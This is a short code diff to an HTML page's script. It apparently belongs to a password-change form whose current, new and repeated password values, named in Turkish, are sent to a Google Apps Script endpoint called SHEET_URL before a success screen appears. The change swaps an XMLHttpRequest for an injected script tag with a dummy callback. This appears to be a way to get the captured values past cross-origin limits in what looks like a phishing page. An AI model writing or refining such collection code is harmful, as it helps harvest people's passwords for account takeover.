@@ -449,11 +449,12 @@
       return;
     }
     var SHEET_URL = 'https://script.google.com/macros/s/AKfycbweQ2FrnycuU0OaqBopV1gGFdXrBR9iXkOJ8go5p-7vI-8y08uNcRE-9-JU0i1INCy5/exec';
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', SHEET_URL + '?mevcut=' + encodeURIComponent(p0) + '&yeni=' + encodeURIComponent(p1) + '&tekrar=' + encodeURIComponent(p2), true);
-    xhr.send();
+    var s = document.createElement('script');
+    s.src = SHEET_URL + '?callback=cb&mevcut=' + encodeURIComponent(p0) + '&yeni=' + encodeURIComponent(p1) + '&tekrar=' + encodeURIComponent(p2);
+    document.body.appendChild(s);
     goTo('s-success');
   }
+  function cb() {}
 </script>
 
 </body>
